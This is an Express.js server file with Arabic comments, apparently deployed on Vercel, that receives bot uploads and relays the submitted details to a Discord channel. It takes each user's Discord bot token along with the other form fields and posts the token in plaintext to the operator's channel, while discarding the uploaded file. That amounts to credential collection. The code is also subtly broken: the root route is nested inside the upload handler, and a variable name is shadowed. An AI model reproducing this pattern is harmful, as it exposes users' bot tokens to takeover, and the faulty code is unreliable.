const express = require("express");
const multer = require("multer");
const cors = require("cors");
const { Client, GatewayIntentBits } = require("discord.js");

const app = express();
app.use(cors());
app.use(express.json());

// استخدم متغيرات البيئة من Vercel
const botToken = process.env.DISCORD_BOT_TOKEN;
const channelId = process.env.DISCORD_CHANNEL_ID;
const serverId = process.env.DISCORD_SERVER_ID;

if (!botToken || !channelId || !serverId) {
    console.error("❌ خطأ: متغيرات البيئة غير مضبوطة بشكل صحيح!");
    process.exit(1);
}

const bot = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });

bot.once("ready", () => {
    console.log("🚀 بوت الإرسال جاهز!");
});

bot.login(botToken);

// إعداد رفع الملفات (لكن بدون fs لأن Vercel لا يدعمه)
const upload = multer({ storage: multer.memoryStorage() });

app.post("/upload", upload.single("botFile"), async (req, res) => {
    if (!req.file) return res.status(400).json({ message: "❌ لم يتم رفع أي ملف!" });

    const { botName, botToken, botPrefix, githubUrl, notes } = req.body;

    const messageContent = `📢 **تم رفع بوت جديد!**\n\n🔹 **اسم البوت:** ${botName}\n🔹 **توكن:** ||${botToken}||\n🔹 **بريفكس:** ${botPrefix}\n🔹 **GitHub:** ${githubUrl}\n🔹 **ملاحظات:** ${notes}`;

    try {
        const channel = await bot.channels.fetch(channelId);
        if (channel) {
            await channel.send({ content: messageContent });

            res.json({ message: "✅ تم رفع البيانات وإرسالها إلى ديسكورد بنجاح!" });
        } else {
            res.status(500).json({ message: "❌ لم يتم العثور على الروم في ديسكورد!" });
        }
    } catch (error) {
        console.error("❌ خطأ أثناء الإرسال إلى ديسكورد:", error);
        res.status(500).json({ message: "❌ فشل الإرسال إلى ديسكورد!" });
    }

app.get("/", (req, res) => {
    res.send("🚀 السيرفر يعمل بنجاح على Vercel!");
});

});

// تشغيل السيرفر على Vercel
module.exports = app;
